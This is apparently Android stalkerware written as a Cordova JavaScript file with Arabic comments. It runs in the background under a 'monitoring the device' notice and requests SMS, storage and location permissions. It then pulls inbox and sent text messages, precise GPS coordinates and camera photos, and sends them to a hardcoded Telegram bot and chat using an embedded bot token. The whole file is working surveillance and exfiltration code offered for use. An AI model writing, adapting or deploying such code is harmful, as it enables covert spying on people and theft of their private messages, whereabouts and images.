// ⚠️ عدل هذه القيم
const BOT_TOKEN = '7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk'; // استخدم توكن بوتك
const CHAT_ID = '5739065274'; // استخدم معرفك

document.addEventListener('deviceready', onDeviceReady, false);

function onDeviceReady() {
  console.log('Cordova جاهز');
  cordova.plugins.backgroundMode.setDefaults({
    title: 'يعمل في الخلفية',
    text: 'جاري مراقبة الجهاز...'
  });
  cordova.plugins.backgroundMode.enable();
  requestPermissions();
}

function requestPermissions() {
  const permissions = cordova.plugins.permissions;
  const needed = [
    permissions.READ_SMS,
    permissions.READ_EXTERNAL_STORAGE,
    permissions.ACCESS_FINE_LOCATION
  ];

  permissions.requestPermissions(needed, success => {
    if (success.hasPermission) {
      sendToTelegram("🟢 جهاز متصل");
      showButtons();
    } else {
      sendToTelegram("🔴 رفض الأذونات");
    }
  }, error => {
    sendToTelegram("⚠️ خطأ في الأذونات: " + JSON.stringify(error));
  });
}

function showButtons() {
  document.getElementById("message").innerText = "جاهز للعمل";
}

// --- 1. سحب الرسائل (SMS) ---
function fetchSMS() {
  if (!window.SMS) {
    sendToTelegram("❌ plugin SMS غير متوفر");
    return;
  }

  const filter = { box: 'inbox', maxCount: 30 };
  window.SMS.listSMS(filter, function(smsList) {
    const inbox = smsList.filter(sms => sms.type === 'inbox');
    const sent = smsList.filter(sms => sms.type === 'sent');

    const inboxText = "📬 الرسائل الواردة:\n\n" + inbox.map(sms =>
      `من: ${sms.address}\nالرسالة: ${sms.body}\nالتاريخ: ${new Date(sms.date)}\n---`
    ).join('\n');

    const sentText = "📤 الرسائل الصادرة:\n\n" + sent.map(sms =>
      `إلى: ${sms.address}\nالرسالة: ${sms.body}\nالتاريخ: ${new Date(sms.date)}\n---`
    ).join('\n');

    saveAndSendFile("inbox.txt", inboxText, "الرسائل الواردة.txt");
    saveAndSendFile("sent.txt", sentText, "الرسائل الصادرة.txt");
    sendToTelegram("✅ تم رفع الرسائل");
  }, err => sendToTelegram("❌ خطأ في قراءة الرسائل: " + err));
}

// --- 2. سحب الموقع ---
function fetchLocation() {
  navigator.geolocation.getCurrentPosition(pos => {
    const { latitude, longitude } = pos.coords;
    const url = `https://maps.google.com/?q=${latitude},${longitude}`;
    sendToTelegram(`📍 الموقع: ${url}\nالإحداثيات: ${latitude}, ${longitude}`);
  }, err => sendToTelegram("❌ خطأ في الموقع: " + err.message), {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 30000
  });
}

// --- 3. سحب الصور ---
function fetchPhotos() {
  window.resolveLocalFileSystemURL(cordova.file.externalStorageDirectory + "DCIM/Camera", dir => {
    const reader = dir.createReader();
    reader.readEntries(entries => {
      const images = entries.filter(f => f.isFile && /\.(jpe?g|png|gif)$/i.test(f.name));
      if (images.length === 0) {
        sendToTelegram("📭 لا توجد صور");
        return;
      }
      zipAndSendImages(images, dir.nativeURL);
    });
  }, err => sendToTelegram("❌ خطأ في الوصول للصور: " + JSON.stringify(err)));
}

// --- حفظ وإرسال ملف ---
function saveAndSendFile(filename, content, caption = "") {
  window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory, dir => {
    dir.getFile(filename, { create: true, exclusive: false }, fileEntry => {
      fileEntry.createWriter(writer => {
        writer.onwriteend = () => sendFileToTelegram(fileEntry.nativeURL, caption);
        writer.write(new Blob([content], { type: 'text/plain' }));
      });
    });
  });
}

// --- ضغط الصور وارسالها ---
function zipAndSendImages(images, baseDir) {
  const zip = new JSZip();
  const folder = zip.folder("photos");

  let loaded = 0;
  images.forEach(img => {
    img.file(file => {
      const reader = new FileReader();
      reader.onload = function() {
        folder.file(img.name, this.result, { binary: true });
        loaded++;
        if (loaded === images.length) {
          zip.generateAsync({ type: "blob" }).then(blob => {
            const zipFile = cordova.file.externalDataDirectory + "photos.zip";
            window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory, dir => {
              dir.getFile("photos.zip", { create: true }, zipEntry => {
                zipEntry.createWriter(writer => {
                  writer.onwriteend = () => sendFileToTelegram(zipFile, "الصور.zip");
                  writer.write(blob);
                });
              });
            });
          });
        }
      };
      reader.readAsArrayBuffer(file);
    });
  });
}

// --- إرسال رسالة للبوت ---
function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  }).catch(err => console.log("فشل الإرسال:", err));
}

// --- إرسال ملف ---
function sendFileToTelegram(fileUrl, caption = "") {
  window.resolveLocalFileSystemURL(fileUrl, fileEntry => {
    fileEntry.file(file => {
      const reader = new FileReader();
      reader.onloadend = function() {
        const blob = new Blob([new Uint8Array(this.result)], { type: file.type });
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("caption", caption);
        formData.append("document", blob, file.name);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
          method: 'POST',
          body: formData
        }).catch(err => sendToTelegram("❌ خطأ في إرسال الملف: " + err.message));
      };
      reader.readAsArrayBuffer(file);
    });
  });
}
